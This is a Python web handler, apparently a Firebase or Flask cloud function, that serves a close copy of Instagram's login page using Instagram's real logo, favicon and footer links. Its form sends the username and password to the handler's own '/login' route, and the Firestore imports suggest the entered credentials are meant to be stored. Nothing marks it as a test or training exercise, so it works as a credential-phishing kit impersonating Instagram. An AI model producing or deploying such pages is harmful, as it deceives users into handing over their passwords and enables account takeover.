import firebase_admin
from firebase_admin import credentials, firestore, initialize_app
from datetime import datetime
from flask import Response
import json
import os

def handler(request):
    headers = {
        'Content-Type': 'text/html',
    }

    html_content = '''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <link rel="shortcut icon" href="https://www.instagram.com/static/images/ico/favicon.ico/36b3ee2d91ed.ico" type="image/x-icon">
        <title>Login • Instagram</title>
        <style>
            * {
                box-sizing: border-box;
            }
            
            body {
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
                background-color: #fafafa;
                margin: 0;
                padding: 0;
                display: flex;
                flex-direction: column;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                color: #262626;
                -webkit-text-size-adjust: 100%;
            }
            
            .login-box, .signup-box {
                width: 100%;
                max-width: 350px;
                background-color: #ffffff;
                border: 1px solid #dbdbdb;
                padding: 20px 40px;
                text-align: center;
                font-size: 14px;
                margin-top: 12px;
                margin-bottom: 10px;
                border-radius: 1px;
            }
            
            .logo {
                margin: 22px auto 12px;
                display: flex;
                justify-content: center;
            }
            
            .logo img {
                width: 175px;
                height: auto;
            }
            
            .login-form .input-group {
                position: relative;
                margin: 6px 0;
            }
            
            .login-form input {
                width: 100%;
                padding: 14px 8px 2px 8px;
                border: 1px solid #dbdbdb;
                border-radius: 3px;
                background-color: #fafafa;
                font-size: 12px;
                color: #262626;
                height: 44px;
                box-sizing: border-box;
            }
            
            .login-form input:-webkit-autofill,
            .login-form input:-webkit-autofill:hover, 
            .login-form input:-webkit-autofill:focus {
                -webkit-text-fill-color: #262626 !important;
                -webkit-box-shadow: 0 0 0px 1000px #fafafa inset !important;
                transition: background-color 5000s ease-in-out 0s !important;
                font-size: 16px !important;
            }
            
            .login-form label {
                position: absolute;
                left: 8px;
                top: 50%;
                transform: translateY(-50%);
                color: #8e8e8e;
                font-size: 12px;
                pointer-events: none;
                transition: all 0.1s ease;
            }
            
            .login-form input:focus + label,
            .login-form input:not(:placeholder-shown) + label,
            .login-form input:-webkit-autofill + label {
                top: 3px;
                transform: none;
                font-size: 10px;
                color: #8e8e8e;
            }
            
            .login-form input:focus {
                outline: none;
                border-color: #a8a8a8;
            }
            
            .show-hide-btn {
                position: absolute;
                right: 8px;
                top: 50%;
                transform: translateY(-50%);
                background: none;
                border: none;
                color: #262626;
                cursor: pointer;
                font-size: 14px;
                font-weight: 545;
                padding: 0;
                margin: 0;
                display: none;
            }
            
            .login-btn {
                width: 100%;
                padding: 7px 16px;
                margin: 8px 0;
                background-color: #0095f6;
                color: white;
                border: none;
                border-radius: 8px;
                font-weight: 600;
                cursor: pointer;
                font-size: 14px;
                height: 34px;
            }
            
            .login-btn:disabled {
                background-color: #4cb5f9;
                cursor: default;
            }
            
            .facebook-login {
                color: #3579ea;
                font-weight: 600;
                text-decoration: none;
                display: flex;
                align-items: center;
                justify-content: center;
                margin: 12px 0;
                font-size: 14px;
            }
            
            .facebook-icon {
                width: 16px;
                height: 16px;
                margin-right: 8px;
                background-color: #0095f6;
                -webkit-mask: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath d='M22.675 0h-21.35c-.732 0-1.325.593-1.325 1.325v21.351c0 .731.593 1.324 1.325 1.324h11.495v-9.294h-3.128v-3.622h3.128v-2.671c0-3.1 1.893-4.788 4.659-4.788 1.325 0 2.463.099 2.795.143v3.24l-1.918.001c-1.504 0-1.795.715-1.795 1.763v2.313h3.587l-.467 3.622h-3.12v9.293h6.116c.73 0 1.323-.593 1.323-1.325v-21.35c0-.732-.593-1.325-1.325-1.325z'/%3E%3C/svg%3E") no-repeat center;
                mask: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath d='M22.675 0h-21.35c-.732 0-1.325.593-1.325 1.325v21.351c0 .731.593 1.324 1.325 1.324h11.495v-9.294h-3.128v-3.622h3.128v-2.671c0-3.1 1.893-4.788 4.659-4.788 1.325 0 2.463.099 2.795.143v3.24l-1.918.001c-1.504 0-1.795.715-1.795 1.763v2.313h3.587l-.467 3.622h-3.12v9.293h6.116c.73 0 1.323-.593 1.323-1.325v-21.35c0-.732-.593-1.325-1.325-1.325z'/%3E%3C/svg%3E") no-repeat center;
            }
            
            .divider {
                display: flex;
                align-items: center;
                margin: 18px 0;
                color: #8e8e8e;
                font-size: 13px;
                font-weight: 600;
            }
            
            .divider::before, .divider::after {
                content: "";
                flex: 1;
                border-bottom: 1px solid #dbdbdb;
                margin: 0 18px;
            }
            
            .signup-link {
                color: #0095f6;
                font-weight: 600;
                text-decoration: none;
            }
            
            .forgot-pw {
                font-size: 14px;
                margin: 12px 0;
                font-weight: 545;
                color: #000000;
                text-decoration: none;
                display: inline-block;
            }
            
            .app-section {
                text-align: center;
                margin: 15px 0;
                width: 100%;
                max-width: 350px;
            }
            
            .app-section p {
                margin: 10px 0 20px;
                font-size: 14px;
                color: #262626;
            }
            
            .app-badges {
                display: flex;
                justify-content: center;
                gap: 8px;
            }
            
            .app-badges img {
                height: 40px;
            }
            
            .footer-links {
                display: flex;
                flex-wrap: wrap;
                justify-content: center;
                max-width: 900px;
                margin: 60px 0 15px 0;
                font-size: 12px;
                padding: 0 20px;
            }
            
            .footer-links a {
                color: #8e8e8e;
                text-decoration: none;
                margin: 0 8px 12px;
                white-space: nowrap;
            }
            
            .footer-links a:hover {
                text-decoration: underline;
            }
            
            .copyright {
                font-size: 12px;
                color: #8e8e8e;
                text-align: center;
                margin-bottom: 30px;
            }
            
            .language-selector {
                display: inline-flex;
                align-items: center;
                position: relative;
                font-size: 12px;
                color: #8e8e8e;
                margin-bottom: 15px;
            }
            
            .language-selector span {
                margin-right: 4px;
            }
            
            .language-arrow {
                font-size: 12px;
                transform: scaleY(0.8);
                display: inline-block;
            }
            
            @media (max-width: 450px) {
                .login-box, .signup-box {
                    border: none;
                    background-color: transparent;
                    padding: 0 20px;
                    max-width: 100%;
                }
                
                body {
                    justify-content: flex-start;
                    padding-top: 40px;
                }
                
                .footer-links {
                    margin-top: 30px;
                }
                
                .app-badges {
                    flex-direction: column;
                    align-items: center;
                }
                
                .app-badges img {
                    height: 44px;
                }
            }
        </style>
    </head>
    <body>
        <div class="login-box">
            <div class="logo">
                <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram">
            </div>
            
            <form class="login-form" action="/login" method="POST">
                <div class="input-group">
                    <input type="text" id="username" name="username" placeholder=" " required>
                    <label for="username">Phone number, username, or email</label>
                </div>
                
                <div class="input-group">
                    <input type="password" id="password" name="password" placeholder=" " required>
                    <label for="password">Password</label>
                    <button type="button" class="show-hide-btn" id="togglePassword">Show</button>
                </div>
                
                <button type="submit" class="login-btn" id="loginButton" disabled>Log in</button>
            </form>
            
            <div class="divider">OR</div>
            
            <a href="https://www.facebook.com/login.php?next=https%3A%2F%2Fwww.facebook.com%2Foidc%2F%3Fapp_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignupviafb%252F%26response_type%3Dcode%26scope%3Dopenid%2Bemail%2Bprofile%2Blinking%26state%3DATlMhmmYuY0mrYPxNG3HJmNIIgJRJJZtj7tKyMrF33MBDT74H9HuZHaByyL0ITtR31HzAgU016hFD_3-eWN6GfWA2Ra7xqnGHhgL8Hr1_3Kr-rbeWm-tpWccv2i0nkQSAFYzCYAfe12DqwXGUQshESN3rufwY8h1dqcaNlerMXvUJk3_mzdQvTHUASoOQnbGOc9eBdSigRdBKmtg3tq1eI_xb2becJO2IsPWWJ-P_qRw5RtMIJrRoomOYt1bup4aZC_9" class="facebook-login">
                <span class="facebook-icon"></span>
                Log in with Facebook
            </a>
            <a href="https://www.instagram.com/accounts/password/reset/" class="forgot-pw">Forgot password?</a>
        </div>
        
        <div class="signup-box">
            Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/" class="signup-link">Sign up</a>
        </div>
        
        <div class="app-section">
            <p>Get the app.</p>
            <div class="app-badges">
                <a href="https://apps.apple.com/us/app/instagram/id389801252"><img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png" alt="Download on the App Store"></a>
                <a href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=ig_mid%3D7A744087-46CA-4803-BEEB-866C6322A2F7%26utm_content%3Dlo%26utm_source%3Dinstagramweb%26utm_medium%3Dbadge"><img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png" alt="GET IT ON Google Play"></a>
            </div>
        </div>
        
        <div class="footer-links">
            <a href="https://www.meta.com/about/?utm_source=about.meta.com&utm_medium=redirect">Meta</a>
            <a href="https://about.instagram.com/">About</a>
            <a href="https://about.instagram.com/blog">Blog</a>
            <a href="https://about.instagram.com/about-us/careers">Jobs</a>
            <a href="https://help.instagram.com/">Help</a>
            <a href="https://developers.facebook.com/docs/instagram-platform">API</a>
            <a href="https://privacycenter.instagram.com/policy/?entry_point=ig_help_center_data_policy_redirect">Privacy</a>
            <a href="https://help.instagram.com/581066165581870/">Terms</a>
            <a href="https://www.instagram.com/explore/locations/">Locations</a>
            <a href="https://www.instagram.com/web/lite/">Instagram Lite</a>
            <a href="https://www.threads.com/">Threads</a>
            <a href="https://www.facebook.com/help/instagram/261704639352628">Contact Uploading & Non-Users</a>
            <a href="https://www.instagram.com/accounts/login/?next=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fmeta_verified%2F%3Fentrypoint%3Dweb_footer%26__coig_login%3D1#">Meta Verified</a>
        </div>
        
        <div class="copyright">
            <div class="language-selector">
                <span>English</span>
                <span class="language-arrow">▾</span>
            </div>
            © 2025 Instagram from Meta
        </div>

        <script>
            document.addEventListener('DOMContentLoaded', function() {
                // Password show/hide toggle
                const togglePassword = document.getElementById('togglePassword');
                const passwordInput = document.getElementById('password');
                const loginButton = document.getElementById('loginButton');
                const usernameInput = document.getElementById('username');
                
                togglePassword.addEventListener('click', function() {
                    const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
                    passwordInput.setAttribute('type', type);
                    this.textContent = type === 'password' ? 'Show' : 'Hide';
                });
                
                // Show/hide toggle button based on password input
                passwordInput.addEventListener('input', function() {
                    if (this.value.length > 0) {
                        togglePassword.style.display = 'block';
                    } else {
                        togglePassword.style.display = 'none';
                        // Reset to password type if empty
                        passwordInput.setAttribute('type', 'password');
                        togglePassword.textContent = 'Show';
                    }
                    updateLoginButton();
                });
                
                usernameInput.addEventListener('input', updateLoginButton);
                
                function updateLoginButton() {
                    if (usernameInput.value.length > 0 && passwordInput.value.length > 0) {
                        loginButton.disabled = false;
                    } else {
                        loginButton.disabled = true;
                    }
                }
                
                // Initialize labels if inputs have values
                const inputs = document.querySelectorAll('.login-form input');
                inputs.forEach(input => {
                    // Check for autofilled values
                    const checkAutofill = setInterval(() => {
                        if(window.getComputedStyle(input, null).getPropertyValue("box-shadow") !== 'none') {
                            input.dispatchEvent(new Event('input'));
                            clearInterval(checkAutofill);
                        }
                    }, 100);
                    
                    input.addEventListener('input', function() {
                        if(this.value) {
                            this.nextElementSibling.style.top = '3px';
                            this.nextElementSibling.style.transform = 'none';
                            this.nextElementSibling.style.fontSize = '10px';
                        } else {
                            this.nextElementSibling.style.top = '50%';
                            this.nextElementSibling.style.transform = 'translateY(-50%)';
                            this.nextElementSibling.style.fontSize = '12px';
                        }
                    });
                    
                    input.addEventListener('focus', function() {
                        this.nextElementSibling.style.top = '3px';
                        this.nextElementSibling.style.transform = 'none';
                        this.nextElementSibling.style.fontSize = '10px';
                    });
                    
                    input.addEventListener('blur', function() {
                        if(!this.value) {
                            this.nextElementSibling.style.top = '50%';
                            this.nextElementSibling.style.transform = 'translateY(-50%)';
                            this.nextElementSibling.style.fontSize = '12px';
                        }
                    });
                });
            });
        </script>
    </body>
    </html>
    '''
    
    return Response(html_content, headers=headers)